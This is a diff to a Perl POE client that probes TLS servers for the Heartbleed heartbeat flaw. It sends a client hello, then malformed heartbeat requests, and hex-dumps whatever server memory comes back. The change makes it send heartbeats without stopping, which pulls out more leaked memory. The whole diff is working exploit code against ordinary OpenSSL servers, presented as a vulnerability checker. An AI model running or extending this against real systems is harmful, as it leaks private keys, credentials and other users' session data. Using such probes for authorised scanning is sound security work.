@@ -100,7 +100,9 @@ POE::Component::Client::TCP->new(
 	Filter        => [
 		'POE::Filter::Block',
 		LengthCodec => [
+			# encoder
 			sub {},
+			# decoder
 			sub {
 				my ($block) = @_;
 				my ($type, $ver, $pay) = unpack_block($$block);
@@ -114,43 +116,57 @@ POE::Component::Client::TCP->new(
 	],
 
 	ConnectError  => sub {
-		my ($op, $errno, $errstr) = @_[ARG0..ARG2];
+		my ($kernel, $op, $errno, $errstr) = @_[KERNEL, ARG0..ARG2];
 		warn "$op error $errno occurred: $errstr\n";
-		$_[KERNEL]->yield('shutdown');
+		$kernel->yield('shutdown');
 	},
 	ServerError   => sub {
-		my ($op, $errno, $errstr) = @_[ARG0..ARG2];
+		my ($kernel, $op, $errno, $errstr) = @_[KERNEL, ARG0..ARG2];
 		warn "$op error $errno occurred: $errstr\n";
-		$_[KERNEL]->yield('shutdown');
+		$kernel->yield('shutdown');
 	},
 
 	Connected     => sub {
+		my $heap = $_[HEAP];
+		$heap->{wait_for_hello} = 1;
+		$heap->{heartbeats} = 0;
+		$heap->{bytes_rcvd} = 0;
+
 		print "Sending client hello...\n";
-		$_[HEAP]->{server}->put($helo);
-		$_[HEAP]->{wait_for_hello} = 1;
+		$heap->{server}->put($helo);
 	},
 	ServerInput   => sub {
-		my $input = $_[ARG0];
-		my ($type, $ver, $pay) = unpack_block($input);
+		my ($kernel, $heap, $input) = @_[KERNEL, HEAP, ARG0];
+		my ($type, undef, $pay) = unpack_block($input);
 
-		if ($_[HEAP]->{wait_for_hello}) {
+		if ($heap->{wait_for_hello}) {
 			if (($type == 22) and ($pay =~ /^\x0e/)) {
 				print "Got server hello! Sending heartbeats...\n";
-				$_[HEAP]->{wait_for_hello} = 0;
-				$_[HEAP]->{server}->put($hb);
+				$heap->{wait_for_hello} = 0;
+				$heap->{server}->put($hb);
 			}
 		} else {
 			if ($type == 21) {
 				print "Server returned error, likely not vulnerable\n";
-				$_[KERNEL]->yield('shutdown');
+				$kernel->yield('shutdown');
 			} elsif ($type == 24) {
+				$heap->{heartbeats} += 1;
+				$heap->{bytes_rcvd} += length($pay);
+
 				print "Received heartbeat response...\n";
 				printf "  Server returned more data than it should've (%d bytes), probably vulnerable...\n", length($pay)
 					if length($pay) > 3;
 				print HexDump($pay);
 			}
 
-			#$_[HEAP]->{server}->put($hb);
+			# TODO sometimes we don't get exactly 0xffff bytes back. guess
+			# there's some extra fluff that I haven't researched about enough
+			# yet, so just keep sending heartbeats, even when we haven't read
+			# the entire response from the previous request yet.
+			#if (($heap->{bytes_rcvd} & 0xffff) == 0) {
+			#	print "Sending heartbeat...\n";
+				$heap->{server}->put($hb);
+			#}
 		}
 	},
 );
